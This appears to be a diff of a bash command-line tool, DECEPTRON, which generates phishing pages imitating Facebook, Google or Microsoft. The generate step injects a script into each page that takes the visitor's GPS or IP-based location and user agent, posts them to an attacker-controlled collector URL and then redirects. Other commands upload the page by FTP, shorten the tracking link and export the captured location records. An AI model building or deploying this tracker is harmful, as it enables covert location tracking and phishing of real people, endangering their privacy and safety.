@@ -1,231 +1,208 @@
 #!/bin/bash
-# DECEPTRON Main CLI
-# Created by: anonymous-beta | https://github.com/anonymous-beta
+# DECEPTRON Main CLI (fixed) — banner served from banner.py
 
-VERSION="1.0"
-CONFIG="config.json"
-DB_PATH=$(python3 -c "import json; print(json.load(open('$CONFIG')).get('db_path','db/hits.db'))" 2>/dev/null || echo "db/hits.db")
+VERSION="1.1"
 
 banner() {
-    echo ""
-    echo "    ██████╗ ███████╗ ██████╗███████╗██████╗ ████████╗ ██████╗ ███╗   ██╗"
-    echo "    ██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗████╗  ██║"
-    echo "    ██║  ██║█████╗  ██║     █████╗  ██████╔╝   ██║   ██║   ██║██╔██╗ ██║"
-    echo "    ██║  ██║██╔══╝  ██║     ██╔══╝  ██╔══██╗   ██║   ██║   ██║██║╚██╗██║"
-    echo "    ██████╔╝███████╗╚██████╗███████╗██║  ██║   ██║   ╚██████╔╝██║ ╚████║"
-    echo "    ╚═════╝ ╚══════╝ ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝"
-    echo "    v${VERSION} — Red Team Geospatial Intelligence Framework"
-    echo "    Created by: anonymous-beta | https://github.com/anonymous-beta"
-    echo ""
+    python3 banner.py 2>/dev/null || cat <<'FALLBACK'
+
+  ██╗  ██╗ DECEPTRON v1.1 — Red Team Geospatial Intelligence Framework
+FALLBACK
 }
 
 help_menu() {
     banner
-    echo "Usage: ./deceptron.sh <command>"
-    echo ""
-    echo "Commands:"
-    echo "  setup       — Initialize environment and database"
-    echo "  server      — Start collector + dashboard server"
-    echo "  generate    — Create and deploy a phishing campaign"
-    echo "  list        — List active campaigns"
-    echo "  dashboard   — Open dashboard URL"
-    echo "  export      — Export data (csv/json)"
-    echo "  shorten     — Obfuscate a tracking link"
-    echo "  status      — Show server status"
-    echo "  help        — Show this menu"
-    echo ""
+    cat <<'USAGE'
+Usage: ./deceptron.sh <command>
+
+Commands:
+  setup       — Initialize environment and database
+  server      — Start collector + dashboard server
+  generate    — Create and deploy a phishing campaign
+  list        — Show all campaigns
+  dashboard   — Open dashboard in browser
+  export      — Export data (json/csv)
+  shorten     — Shorten a link
+  status      — Check if server is running
+  help        — Show this menu
+USAGE
 }
 
-cmd_setup() {
-    bash setup.sh
-}
+cmd_setup() { ./setup.sh; }
 
 cmd_server() {
-    banner
-    echo "[+] Starting DECEPTRON Collector + Dashboard..."
-    python3 server.py &
-    SERVER_PID=$!
-    echo $SERVER_PID > .deceptron.pid
-    echo "[+] Server PID: $SERVER_PID"
-    echo "[+] Dashboard: http://localhost:5000"
-    echo "[+] Collector: http://localhost:5000/log"
-    echo "[+] Press Ctrl+C to stop"
-    wait $SERVER_PID
+    echo "[+] Starting server... (Ctrl+C to stop)"
+    python3 server.py
 }
 
 cmd_generate() {
-    banner
-    python3 - << 'PYEOF'
-import json, os, uuid, sys, ftplib
+    python3 - <<'PYEOF'
+import json, os, sqlite3, uuid, ftplib
+from init_db import init_db
+from banner import print_banner
 
-cfg = json.load(open('config.json'))
-db_path = cfg.get('db_path', 'db/hits.db')
+print_banner()
 
-campaign = input("[?] Campaign name (alphanumeric): ").strip()
-if not campaign or not campaign.replace('_','').isalnum():
-    print("[!] Invalid campaign name"); sys.exit(1)
+cfg = json.load(open("config.json"))
+db_path = cfg.get("db_path", "db/hits.db")
+init_db(db_path)
 
-template = input("[?] Template type (login/update/security/custom): ").strip().lower()
-if template not in ('login','update','security','custom'):
-    print("[!] Invalid template"); sys.exit(1)
-
-redirect = input("[?] Redirect URL (leave blank for none): ").strip()
-if not redirect:
-    redirect = "https://www.google.com"
-
-base_url = cfg.get('base_url','')
-if not base_url:
-    print("[!] base_url not set in config.json"); sys.exit(1)
-
-collector = cfg.get('collector_url','')
-if not collector:
-    collector = f"http://{cfg.get('server_host','0.0.0.0')}:{cfg.get('server_port',5000)}/log"
-
-session_id = uuid.uuid4().hex[:8]
-tracking_link = f"{base_url}/{campaign}?id={session_id}"
-
-# Build HTML
+collector = cfg.get("collector_url", "").strip()
+base_url = cfg.get("base_url", "").strip()
 templates_dir = "templates"
-if template == 'custom':
-    custom_html = input("[?] Paste custom HTML (or press enter for blank): ").strip()
-    if not custom_html:
-        custom_html = "<h1>Loading...</h1>"
-    html_body = custom_html
+
+if not collector:
+    print("[!] collector_url not set in config.json — data will not reach you.")
+    print("[!] Example: https://your-domain.com/log  (must be HTTPS)")
+    collector = input("[?] Enter collector URL to use anyway: ").strip()
+    if not collector:
+        raise SystemExit("[!] Aborting: no collector URL.")
+
+campaign = input("[?] Campaign name: ").strip()
+while not campaign or "/" in campaign or ".." in campaign or any(c in campaign for c in "\"'`<>;"):
+    campaign = input("[!] Invalid name. Campaign name: ").strip()
+
+VALID_TEMPLATES = ("facebook", "google", "microsoft", "security", "update", "custom")
+template = input("[?] Template (facebook/google/microsoft/security/update/custom): ").strip().lower()
+if template not in VALID_TEMPLATES:
+    print(f"[!] Unknown template, defaulting to 'facebook'")
+    template = "facebook"
+redirect = input("[?] Redirect URL after capture: ").strip() or "https://www.google.com"
+session_id = uuid.uuid4().hex[:8]
+
+if template == "custom":
+    print("[?] Paste custom HTML (finish with an empty line):")
+    lines = []
+    while True:
+        try:
+            line = input()
+        except EOFError:
+            break
+        if line == "" and lines and lines[-1] == "":
+            break
+        lines.append(line)
+    html_body = "\n".join(lines).strip() or "<h1>Loading...</h1>"
 else:
-    with open(f"{templates_dir}/{template}.html", "r") as f:
+    with open(f"{templates_dir}/{template}.html") as f:
         html_body = f.read()
 
-# Inject tracker script
+# Tracker script — json.dumps makes values quote/quote-injection safe
+import json as _json
 tracker_script = f"""
 <script>
-(function(){{
-    const collector = "{collector}";
-    const campaign = "{campaign}";
-    const session = "{session_id}";
-    const redirect = "{redirect}";
-    
-    function sendData(lat, lng, acc, source){{
+(function() {{
+    const collector = {_json.dumps(collector)};
+    const campaign = {_json.dumps(campaign)};
+    const session = {_json.dumps(session_id)};
+    const redirect = {_json.dumps(redirect)};
+
+    function sendData(lat, lng, acc, source) {{
         fetch(collector, {{
             method: 'POST',
             headers: {{'Content-Type': 'application/json'}},
             body: JSON.stringify({{
-                id: campaign,
-                session: session,
-                lat: lat,
-                lng: lng,
-                acc: acc,
+                id: campaign, session: session,
+                lat: lat, lng: lng, acc: acc,
                 ua: navigator.userAgent,
-                ts: Math.floor(Date.now()/1000),
-                ip: '',
+                ts: Math.floor(Date.now() / 1000),
                 source: source
             }})
-        }}).then(()=>{{
-            window.location.href = redirect;
-        }}).catch(()=>{{
+        }}).catch(function() {{}}).finally(function() {{
             window.location.href = redirect;
         }});
     }}
-    
-    if(navigator.geolocation){{
+
+    function ipFallback() {{
+        fetch('https://ipapi.co/json/')
+            .then(function(r) {{ return r.json(); }})
+            .then(function(d) {{ sendData(d.latitude || 0, d.longitude || 0, 5000, 'ip'); }})
+            .catch(function() {{ sendData(0, 0, 99999, 'unknown'); }});
+    }}
+
+    if (navigator.geolocation) {{
         navigator.geolocation.getCurrentPosition(
-            (pos)=>{{
-                sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps');
-            }},
-            (err)=>{{
-                // Fallback: IP geolocation via ipapi
-                fetch('https://ipapi.co/json/')
-                .then(r=>r.json())
-                .then(data=>{{
-                    sendData(data.latitude||0, data.longitude||0, 5000, 'ip');
-                }})
-                .catch(()=>{{
-                    sendData(0,0,99999,'unknown');
-                }});
-            }},
-            {{enableHighAccuracy:true, timeout:10000, maximumAge:0}}
+            function(pos) {{ sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps'); }},
+            ipFallback,
+            {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
         );
     }} else {{
-        fetch('https://ipapi.co/json/')
-        .then(r=>r.json())
-        .then(data=>{{
-            sendData(data.latitude||0, data.longitude||0, 5000, 'ip');
-        }})
-        .catch(()=>{{
-            sendData(0,0,99999,'unknown');
-        }});
+        ipFallback();
     }}
 }})();
 </script>
 """
 
-# Insert script before </body> or append
 if "</body>" in html_body:
     html_body = html_body.replace("</body>", tracker_script + "\n</body>")
 else:
     html_body += tracker_script
 
-# Save generated
 out_dir = f"generated/{campaign}"
 os.makedirs(out_dir, exist_ok=True)
 out_path = f"{out_dir}/index.html"
 with open(out_path, "w") as f:
     f.write(html_body)
-
 print(f"[+] Generated: {out_path}")
 
-# Upload via FTP if configured
-ftp_host = cfg.get('ftp_host','')
+if base_url:
+    tracking_link = f"{base_url.rstrip('/')}/{campaign}/"
+else:
+    tracking_link = f"[local file] {out_path}"
+
+ftp_host = cfg.get("ftp_host", "")
 if ftp_host:
     try:
-        ftp = ftplib.FTP(ftp_host)
-        ftp.login(cfg.get('ftp_user',''), cfg.get('ftp_pass',''))
-        ftp.cwd(cfg.get('ftp_path','/public_html'))
-        
-        # Create campaign dir
+        ftp = ftplib.FTP(ftp_host, timeout=30)
+        ftp.login(cfg.get("ftp_user", ""), cfg.get("ftp_pass", ""))
+        ftp.cwd(cfg.get("ftp_path", "/public_html"))
         try:
             ftp.mkd(campaign)
-        except:
+        except Exception:
             pass
         ftp.cwd(campaign)
-        
-        with open(out_path, 'rb') as f:
-            ftp.storbinary(f'STOR index.html', f)
+        with open(out_path, "rb") as f:
+            ftp.storbinary("STOR index.html", f)
         ftp.quit()
-        print(f"[+] Uploaded to: {base_url}/{campaign}")
+        print(f"[+] Uploaded to: {tracking_link}")
     except Exception as e:
         print(f"[!] FTP upload failed: {e}")
         print(f"[!] Manual upload required: {out_path}")
 else:
     print(f"[!] No FTP config. Manual upload: {out_path}")
 
-# Store in DB
-import sqlite3
 conn = sqlite3.connect(db_path)
 c = conn.cursor()
-c.execute("INSERT OR REPLACE INTO campaigns (name, template_type, redirect_url, link) VALUES (?,?,?,?)",
+c.execute("""INSERT INTO campaigns (name, template_type, redirect_url, link)
+             VALUES (?,?,?,?)
+             ON CONFLICT(name) DO UPDATE SET
+               template_type=excluded.template_type,
+               redirect_url=excluded.redirect_url,
+               link=excluded.link""",
           (campaign, template, redirect, tracking_link))
 conn.commit()
 conn.close()
 
 print(f"[+] Tracking link: {tracking_link}")
-print(f"[+] Send this to the target.")
 PYEOF
 }
 
 cmd_list() {
-    python3 -c "
-import sqlite3, json
-db = json.load(open('config.json')).get('db_path','db/hits.db')
-conn = sqlite3.connect(db)
+    python3 - <<'PYEOF'
+import sqlite3, datetime
+from init_db import init_db
+conn = sqlite3.connect(init_db())
 c = conn.cursor()
-c.execute('SELECT name, template_type, link, created_at FROM campaigns ORDER BY created_at DESC')
+c.execute("SELECT name, template_type, link, created_at FROM campaigns ORDER BY created_at DESC")
 rows = c.fetchall()
-print(f'{\"Campaign\":<20} {\"Type\":<10} {\"Link\":<40} {\"Created\"}')
-print('-'*90)
+print(f"{'Campaign':<20} {'Type':<10} {'Link':<45} {'Created'}")
+print("-" * 95)
 for r in rows:
-    print(f'{r[0]:<20} {r[1]:<10} {r[2]:<40} {r[3]}')
+    created = datetime.datetime.fromtimestamp(r[3]).strftime("%Y-%m-%d %H:%M") if r[3] else "?"
+    print(f"{r[0]:<20} {r[1]:<10} {r[2]:<45} {created}")
+if not rows:
+    print("(no campaigns yet — run ./deceptron.sh generate)")
 conn.close()
-"
+PYEOF
 }
 
 cmd_dashboard() {
@@ -236,34 +213,37 @@ cmd_dashboard() {
 
 cmd_export() {
     fmt=${2:-json}
-    python3 -c "
+    case "$fmt" in
+        json|csv) ;;
+        *) echo "[!] Format must be json or csv"; return 1 ;;
+    esac
+    python3 - "$fmt" <<'PYEOF'
 import sqlite3, json, csv, sys
-db = json.load(open('config.json')).get('db_path','db/hits.db')
-conn = sqlite3.connect(db)
+from init_db import init_db
+fmt = sys.argv[1]
+conn = sqlite3.connect(init_db())
 c = conn.cursor()
-c.execute('SELECT * FROM hits ORDER BY timestamp DESC')
+c.execute("SELECT * FROM hits ORDER BY timestamp DESC")
 rows = c.fetchall()
 cols = [d[0] for d in c.description]
-
-if '$fmt' == 'json':
-    data = [dict(zip(cols, r)) for r in rows]
-    with open('export.json','w') as f:
-        json.dump(data, f, indent=2)
-    print('[+] Exported: export.json')
+if fmt == "json":
+    with open("export.json", "w") as f:
+        json.dump([dict(zip(cols, r)) for r in rows], f, indent=2)
+    print("[+] Exported: export.json")
 else:
-    with open('export.csv','w', newline='') as f:
+    with open("export.csv", "w", newline="") as f:
         w = csv.writer(f)
         w.writerow(cols)
         w.writerows(rows)
-    print('[+] Exported: export.csv')
+    print("[+] Exported: export.csv")
 conn.close()
-"
+PYEOF
 }
 
 cmd_shorten() {
     url=$2
     if [ -z "$url" ]; then
-        read -p "[?] URL to shorten: " url
+        read -r -p "[?] URL to shorten: " url
     fi
     short=$(curl -s "https://tinyurl.com/api-create.php?url=$url")
     echo "[+] Short link: $short"
@@ -275,16 +255,14 @@ cmd_status() {
         if ps -p "$pid" > /dev/null 2>&1; then
             echo "[+] Server running (PID: $pid)"
             echo "[+] Dashboard: http://localhost:5000"
-        else
-            echo "[!] Server not running (stale PID file)"
-            rm -f .deceptron.pid
+            return
         fi
-    else
-        echo "[!] Server not running"
+        rm -f .deceptron.pid
+        echo "[!] Stale PID file removed"
     fi
+    echo "[!] Server not running"
 }
 
-# Main
 case "$1" in
     setup) cmd_setup ;;
     server) cmd_server ;;
